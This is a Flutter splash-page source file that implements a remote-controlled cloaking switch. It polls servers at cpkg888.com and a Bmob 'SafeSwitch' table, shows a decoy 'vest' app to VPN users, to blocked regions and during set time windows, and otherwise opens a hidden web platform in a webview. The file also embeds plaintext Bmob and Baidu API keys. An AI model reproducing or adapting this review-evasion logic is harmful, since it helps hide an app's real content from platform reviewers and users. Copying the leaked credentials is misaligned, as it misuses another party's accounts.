import 'dart:convert';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter_49_yzb/http/request_helper.dart';
import 'package:flutter_49_yzb/page/mj_page.dart';
import 'package:flutter_49_yzb/util/baseutil.dart';
import 'package:flutter_plugin_system/flutter_plugin_system.dart';
import 'package:flutter_49_yzb/bean/first_switch.dart';
import 'package:flutter_49_yzb/bean/first_switch_data.dart';
import 'package:flutter_49_yzb/bean/second_switch_bean.dart';
import 'package:flutter_49_yzb/sp/sp_util.dart';

class SplashPage extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return _SplashPage();
  }
}

class _SplashPage extends State<SplashPage> {
  static String KEY_URL = "url_key";

  //bomb 配置
  static final String applicationId = "4b304d56f3eb14abda51c5c4d0a468a5 ";
  static final String restApiKey = "10d5914cb79d055d1b423f33e5298b54 ";
  static final String contentType = "application/json";

  /*第一重开关地址*/
  static String FIRST_SWITCH = "http://cpkg888.com/3h45gj/ka9f/api/forward/";

  //第一重开关参数
  static final String FIRST_SWITCH_PARMES = "TygIgcTUSreCLiu5";

  /*第二重开地址*/
  static final String SECOND_SWITCH = "https://api.bmob.cn/1/classes/";
  static final String SECOND_SWITCH_KEY = "SafeSwitch";

  //是否进入过平台
  final String IS_ENTERED = "isEntered";

  @override
  void initState() {
    super.initState();
    isHaveNetWork();
  }

  @override
  Widget build(BuildContext context) {
    // TODO: implement build
    return Material(
      child: Container(
        child: Image.asset(
          'images/puppet_bg.jpg',
          fit: BoxFit.fill, //显示可能拉伸，可能裁剪，充满
        ),
      ),
    );
  }

  ///请求第一重开关
  void requestFirst() async {
    String url = FIRST_SWITCH + FIRST_SWITCH_PARMES;
    RequestHelper.getInstance().getOfJson(url, (data) async {
      //请求成功
      FirstSwitch firstSwitch = FirstSwitch.fromJson(data);
      if (firstSwitch.code == 1111) {
        String mData = TextUtil.getJson(firstSwitch.data);
        //允许跳转平台
        FirstSwitchData firstSwitchData =
            FirstSwitchData.fromJson(json.decode(mData));
        //调用插件判断用户是否使用了vpn
        bool isUsedVpn = await FlutterPluginSystem.isVpnUsed();
        if (firstSwitchData.swi == 0 && //开关打开
//            !TextUtil.isEmpty(firstSwitchData.url) &&
            (firstSwitchData.cid != 4) && //不是黑名单
            !isUsedVpn) {
          //未使用vpn
          isInShieldedTime(firstSwitchData.shieldedTime,
              (isShieldedTime) async {
            //是否进入过平台，如果进入过平台则地区，时间屏蔽无效
            bool isEntered = await SpUtils.getBool(IS_ENTERED);
            if (isShieldedTime && !isEntered) {
              //在屏蔽时间内且未进入过平台，跳马甲
              jumpToMj();
            } else {
              //未在时间屏蔽内
              //判断地区屏蔽
              isNeedShieldedArea(firstSwitchData.shieldedArea,
                  (isShieldedArea) {
                if (isShieldedArea && !isEntered) {
                  //在屏蔽地区
                  jumpToMj();
                } else {
                  //平台地址是否为空
                  if (!TextUtil.isEmpty(firstSwitchData.url)) {
                    jumpToWeb(firstSwitchData.url);
                  } else {
                    jumpToMj();
                  }
                }
              });
            }
          });
        } else {
          jumpToMj();
        }
      } else {
        //跳转到马甲
        jumpToMj();
      }
    }, (e) {
      //第一重开关请求失败，则请求第二重开关
      requestSecond();
    });
  }

  ///判断当前时间是否在屏蔽时间段内
  void isInShieldedTime(
      String shieldedTime, shieldedCallBack(bool isShieldedTime)) {
    if (TextUtil.isEmpty(shieldedTime)) {
      shieldedCallBack(false);
    } else {
      //获取北京时间
      RequestHelper.getInstance()
          .getNotJson("http://time.beijing-time.org/time.asp", (data) {
        String nmin = RegexUtils.getValue("nhrs=([^; nmin]*)", data);
        String nsec = RegexUtils.getValue("nmin=([^; nsec]*)", data);
        String curTime = nmin + ":" + nsec;
        if (RegexUtils.isInTime(shieldedTime, curTime)) {
          shieldedCallBack(true);
        } else {
          shieldedCallBack(false);
        }
      }, (e) {
        shieldedCallBack(false);
      });
    }
  }

  ///判断当前位置是否在屏蔽地区内
  void isNeedShieldedArea(
      String shieldedArea, shieldedCallBack(bool isShieldedArea)) {
    if (TextUtil.isEmpty(shieldedArea)) {
      shieldedCallBack(false);
    } else {
      String url = "http://pv.sohu.com/cityjson?ie=utf-8";
      RequestHelper.getInstance().getNotJson(url, (data) {
        //请求成功
        String ip = RegexUtils.getValue("cip\": \"([^\"]*)", data);
        //根据ip获取当前位置信息
        RequestHelper.getInstance().getNotJson(
            "http://api.map.baidu.com/location/ip?ak=sjLtdwgfWWHqYOWGZnGQOPrmaziidSSS&ip=" +
                ip, (data) {
          //请求成功
          String mData = decode(data);
          List<String> split = shieldedArea.split("&");
          for (int i = 0; i < split.length; i++) {
            if (mData.contains(split[i])) {
              shieldedCallBack(true);
              return;
            }
          }
          shieldedCallBack(false);
        }, (e) {
          //请求失败
          shieldedCallBack(false);
        });
      }, (e) {
        //请求失败
        shieldedCallBack(false);
      });
    }
  }

  ///请求第二重开关
  void requestSecond() async {
    Map<String, String> headers = {
      "X-Bmob-Application-Id": applicationId,
      "X-Bmob-REST-API-Key": restApiKey,
      "Content-Type": contentType
    };
    String packageName = await FlutterPluginSystem.getAppPakageName();
    String where = "{\"bundleID\":\"$packageName\"}";
    String url = SECOND_SWITCH + SECOND_SWITCH_KEY + "?where=$where";
    RequestHelper.getInstance().getJsonAndHavaHeader(headers, url, (data) {
      //请求成功
      SecondSwitchBean secondSwitchBean = SecondSwitchBean.fromJson(data);
      if (secondSwitchBean != null &&
          secondSwitchBean.results != null &&
          secondSwitchBean.results.isNotEmpty) {
        Result switchBean = secondSwitchBean.results[0];

        //地区屏蔽判断
        isNeedShieldedArea(switchBean.shieldedArea, (isShieldedArea) async {
          bool isEntered = await SpUtils.getBool(IS_ENTERED); //是否进入过平台
          if (isShieldedArea && !isEntered) {
            //在屏蔽区，未进入过平台
            jumpToMj();
          } else {
            isInShieldedTime(switchBean.shieldedTime, (isShieldedTime) {
              if (isShieldedTime && !isEntered) {
                jumpToMj();
              } else {
                if (switchBean.isOpen && !TextUtil.isEmpty(switchBean.link)) {
                  jumpToWeb(switchBean.link);
                } else {
                  jumpToMj();
                }
              }
            });
          }
        });
      }
    }, (e) {
      //请求失败
      requestFirst();
    });
  }

  ///跳转马甲
  void jumpToMj() {
    Navigator.of(context).pushAndRemoveUntil(
        MaterialPageRoute(builder: (BuildContext context) => new MjPage()),
        (Route route) => route == null);
  }

  ///跳转平台
  void jumpToWeb(String url) {
    SpUtils.addBool(IS_ENTERED, true); //对跳转平台进行记录
//    Navigator.of(context).pushAndRemoveUntil(
//        MaterialPageRoute(builder: (BuildContext context) => new WebPage(url:url)),
//            (Route route) => route == null);
    FlutterPluginSystem.lunchWebView(url,"com.webviewlib.EasonWebActivity");
  }

  String decode(String data) {
    if (data == null) {
      return null;
    }
    StringBuffer retBuff = new StringBuffer();
    int maxLoop = data.length;
    for (int i = 0; i < maxLoop; i++) {
      if (data[i] == '\\') {
        if ((i < maxLoop - 5) &&
            ((data[i + 1] == 'u') || (data[i + 1] == 'U'))) {
          try {
            retBuff.write(int.parse(data.substring(i + 2, i + 6), radix: 16));
            i += 5;
          } on Exception catch (e) {
            retBuff.write(data[i]);
          }
        } else {
          retBuff.write(data[i]);
        }
      } else {
        retBuff.write(data[i]);
      }
    }
    return retBuff.toString();
  }

  void isHaveNetWork() async {
    bool isHaveNetWork = await FlutterPluginSystem.isHaveNetWork();
    if (!isHaveNetWork) {//没有网络则退出应用程序
      ToastUtil.showCenterShort("当前网络不用");
      jumpToMj();
    } else
      requestFirst();
  }
}
